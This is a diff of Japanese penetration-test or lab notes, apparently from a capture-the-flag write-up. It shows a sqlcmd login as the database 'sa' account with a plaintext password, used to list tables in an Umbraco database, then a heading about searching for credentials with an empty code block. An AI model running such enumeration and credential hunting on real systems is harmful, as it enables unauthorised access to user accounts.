@@ -169,7 +169,41 @@ NULL
 (2 rows affected)
 ```
 
-- umbracoは一般的でない
+- umbracoは一般的でないので、これを使う
+	- 以下テーブル抜粋
+```powershell
+c:\windows\system32\inetsrv>sqlcmd -U sa -P DeathMarchPac1942 -l 30 -Q "USE umbraco;SELECT table_name FROM information_schema.tables;"
+
+table_name                                                                                                                      
+--------------------------------------------------------------------------------------------------------------------------------
+umbracoUserGroup2App                                                          
+umbracoUserStartNode                                                          
+...
+umbracoKeyValue                                                               
+...
+umbracoUserLogin                                                
+umbracoConsent                                                                
+umbracoAudit                                                                  
+cmsMember                                                                     
+cmsMember2MemberGroup                                                         
+
+umbracoLogViewerQuery                                                                                                           
+umbracoContentVersionCleanupPolicy                                                                                              
+umbracoUserGroup2Node                                                         
+umbracoUser                                                                   umbracoAccess                                                                 
+umbracoExternalLogin                                                          
+umbracoExternalLoginToken                                                     
+umbracoTwoFactorLogin                                                         
+umbracoLock                                                                   
+umbracoUserGroup                                                              
+umbracoUser2UserGroup                                                         
+umbracoUserGroup2NodePermission                                               
+```
+
+- 認証情報を探していく
+```powershell
+
+```
 
 
 ---
